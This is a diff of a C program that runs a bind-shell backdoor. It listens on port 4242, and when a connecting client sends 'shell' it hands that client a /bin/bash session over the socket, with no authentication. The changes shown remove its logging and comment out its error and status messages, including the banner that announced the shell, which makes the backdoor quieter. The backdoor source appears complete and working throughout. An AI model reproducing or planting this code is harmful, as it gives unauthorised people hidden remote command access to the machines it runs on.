@@ -6,14 +6,10 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <stdlib.h>
-
 #include <sys/stat.h>
 #include <fcntl.h>
-
 #include <sys/mman.h>
-
 #include <sys/wait.h>
-
 #define MAX 3
 
 
@@ -26,21 +22,13 @@ typedef struct	s_child{
 
 t_child *child;
 
-void console(const char *txt)
-{
-	int fd;
-	fd = open("log.txt", O_CREAT | O_APPEND | O_WRONLY, S_IRUSR | S_IWUSR);
-	dprintf(fd, " log: %s \n", txt);
-	close(fd);
-}
-
-int exec_comm_handler( int sck )
+int bash_prompt( int sck )
 {
 	close(0);
 	close(1);
 	close(2);
 	if( dup(sck) != 0 || dup(sck) != 1 || dup(sck) != 2 ) {
-		perror("error duplicating socket for stdin/stdout/stderr");
+		//perror("error duplicating socket for stdin/stdout/stderr");
 		exit(1);
 	}
 	setvbuf(stdout, NULL, _IONBF, 0);
@@ -48,7 +36,7 @@ int exec_comm_handler( int sck )
 	setvbuf(stdin, NULL, _IONBF, 0);
 	printf("Remote shell ready:\n");
 	execl( "/bin/bash", "/bin/bash", "-c", "bash" );
-	perror("execl");
+	//perror("execl");
 	exit(1);
 }
 
@@ -77,13 +65,12 @@ void new_child(int sck)
 			if (strncmp(buf, "help", 4) == 0) {
 				write(sck, "You really need help?\n", 23);
 			} else if (strncmp(buf, "shell", 5) == 0) {
-				exec_comm_handler(sck);
+				bash_prompt(sck);
 			} else if (strncmp(buf, "quit", 4) == 0) {
 				run = 0;
 			}
 		}
 	}
-
 	close(sck);
 	exit(0);
 }
@@ -105,21 +92,19 @@ void handler(int sig)
 		}
 	}
 	nb--;
-	printf("Pid %d exited. opens: %d \n", pid, nb);
+	//printf("Pid %d exited. opens: %d \n", pid, nb);
 }
 
 int child_slot()
 {
 	for (int i = 0;i < MAX; i++) {
 		if (child[i].pid == -1) {
-			printf("Child found %d\n", i);
+			//printf("Child found %d\n", i);
 			return (i);
 		}
 	}
 	return (-1);
 }
-
-
 
 int main( int argc, char** argv)
 {
@@ -130,14 +115,11 @@ int main( int argc, char** argv)
 	unsigned short port = 4242; /* random port to listen on */
 
 	child = (t_child *)mmap(NULL, sizeof(t_child) * MAX, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-
 	for (int i = 0; i < MAX; i++) {
 		child[i].pid = -1;
 		child[i].socket = -1;
 	}
-
 	signal(SIGCHLD, handler);
-
 	addrlen = sizeof( struct sockaddr_in );
 	memset(&this_addr, 0, addrlen );
 	memset( &peer_addr, 0, addrlen );
@@ -149,9 +131,7 @@ int main( int argc, char** argv)
     setsockopt(sck, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
 	bind( sck, (struct sockaddr*)&this_addr, addrlen );
 	listen( sck, 5 );
-	printf("Remote shell ready connect from nc localhost 4242 \n");
-	printf("Really refresh ? \n");
-
+	//printf("Remote shell ready connect from nc localhost 4242 \n");
 	while( -1 != (client = accept( sck, (struct sockaddr*)&peer_addr, &addrlen ) ) ) {
 		int slot = -1;
 		slot = child_slot();
@@ -164,10 +144,7 @@ int main( int argc, char** argv)
 			if( child_pid == 0 ) {
 				slot = child_slot();
 				int pid = getpid();
-				printf("slot : %d | %d \n", slot, pid);
 				child[slot].pid = pid;
-				//getpid();
-				sleep(1);
 				new_child(client);
 			}
 		} else {
